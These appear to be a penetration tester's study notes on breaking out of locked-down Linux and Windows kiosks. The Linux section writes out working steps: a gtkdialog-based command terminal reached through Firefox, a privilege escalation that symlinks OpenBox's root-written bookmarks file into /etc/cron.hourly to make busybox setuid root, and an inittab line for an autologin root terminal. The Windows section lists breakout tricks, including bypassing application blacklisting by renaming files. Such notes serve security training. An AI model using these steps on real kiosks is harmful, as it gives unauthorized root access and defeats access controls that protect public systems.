    1. Kiosk Enumeration
        //xtigervncviewer for vnc
    2. Command Execution
        //Breakout:  irc://myhost -P "haxor" - select open w/ Firefox
        //Enumeration:  file:///etc/passwd; file:///proc/version
        //Writing Files:  Web Developer Tools > Scratchpad
            //Command Execution: write an html interface file, then open w/ gtkdialog: irc://myhost -f /home/guest/mywindow
                <window>
                    <vbox>
                        <frame Description>
                            <text>
                                <label>This is an example window.</label>
                                    </text>
                        </frame>
                        <hbox>
                            <button ok>
                            <action>echo "testing gtk" > /tmp/gtkoutput.txt</action>
                            </button>
                            <button cancel></button>
                        </hbox>
                    </vbox>
                </window>
    3. Post-Exploitation
        //Create Pseudo-Terminal File (replace left carot from file:///var/www/localhost/index.html):
            <window>
                <vbox>
                    <vbox scrollable="true" width="500" height="400">
                        <edit>
                            <variable>CMDOUTPUT</variable>
                            input file>/tmp/termout.txt</input>
                        </edit>
                    </vbox>
                    <hbox>
                        <text><label>Command:</label></text>
                        <entry><variable>CMDTORUN</variable></entry>
                        <button>
                            <label>Run!</label> 
                            <action>$CMDTORUN > /tmp/termout.txt</action>
                            <action>refresh:CMDOUTPUT</action> 
                        </button>
                    </hbox>
                </vbox>
            </window>
    4. Privilege Escalation
        //check processes - ex. OpenBox running as root
            //can restart w/ 'openbox --replace' - writes bookmarks file as root to same place each time in guest's directory
                //Write to Priv Directory:  ln -s /usr/bin /home/guest/.mozilla/firefox/c3pp43bg.default, then restart openbox
                    //Changing its contents - testscript.sh:
                        echo "#!/bin/bash" > /usr/bin/bookmarks.html
                        echo "gtkdialog -f /home/guest/terminal.txt" >> /usr/bin/bookmarks.html
                    //if the bookmarks.html file was called something.sh, we could add its name to /etc/profile.d
                    //Solution - cron: link our bookmark file to /etc/cron.hourly, then get it to write with openbox --replace:
                        ln -s /etc/cron.hourly /home/guest/.mozilla/firefox/c3pp43bg.default
                    //Create Scratchpad script and run:
                        echo "#!/bin/bash" > /etc/cron.hourly/bookmarks.html
                        echo "chown root:root /home/guest/busybox" >> /etc/cron.hourly/bookmarks.html
                        echo "chmod +s /home/guest/busybox" >> /etc/cron.hourly/bookmarks.html
                //Run commands as root:
                    //Create runterminal.sh:
                        #!/bin/bash
                        /usr/bin/gtkdialog -f /home/guest/terminal.txt
                    //Run to get terminal:  /home/guest/busybox sh /home/guest/runterminal.sh     
            //To get a real terminal:
                xdotool key Ctrl+Alt+F3 - doesn't work here
                Modify /etc/X11/xorg.conf.d/10-xorg.conf and comment out "DontVTSwitch", put it back, then openbox --replace
                //Add to /etc/inittab:  c3::respawn:/sbin/agetty --noclear --autologin root 38400 tty3 linux
                    //and reload:  /sbin/init q
                //then xdotool key Ctrl+Alt+F3 to switch to tty terminal
                    //but for vnc:  
                        #!/bin/bash
                        killall x11vnc 
                        x11vnc -rawfb vt3
    5. Windows Kiosk Breakout Techniques
        //Environmental variables:
            Enviroment variable Location
            %ALLUSERSPROFILE% C:\Documents and Settings\All Users
            %APPDATA% C:\Documents and Settings\Username\Application Data
            %COMMONPROGRAMFILES% C:\Program Files\Common Files
            %COMMONPROGRAMFILES(x86)% C:\Program Files (x86)\Common Files
            %COMSPEC% C:\Windows\System32\cmd.exe
            %HOMEDRIVE% C:\
            %HOMEPATH% C:\Documents and Settings\Username
            %PROGRAMFILES% C:\Program Files
            %PROGRAMFILES(X86)% C:\Program Files (x86) (only in 64-bit version)
            %SystemDrive% C:\
            %SystemRoot% C:\Windows
            %TEMP% and %TMP% C:\Documents and Settings\Username\Local Settings\Temp
            %USERPROFILE% C:\Documents and Settings\Username
            %WINDIR% C:\Windows
        //Network paths:   \\127.0.0.1\C$\Windows\System32\
        //file browser "shell" shortcut:
            shell:System Opens the system folder
            shell:Common Start Menu Opens the Public Start Menu folder
            shell:Downloads Opens the current user’s Downloads folder
            shell:MyComputerFolder Opens the “This PC” window, showing devices and drives for the system
        //help dialog search with shortcut links
        //shortcut creation/modification
        //always try to right click
        //drag and drop onto cmd icon to open
        //file>print>etc.
        //ctrl+alt+del or ctrl+alt+esc for task mgr; other keyboard shortcuts
        //bypass application blacklisting by copying and renaming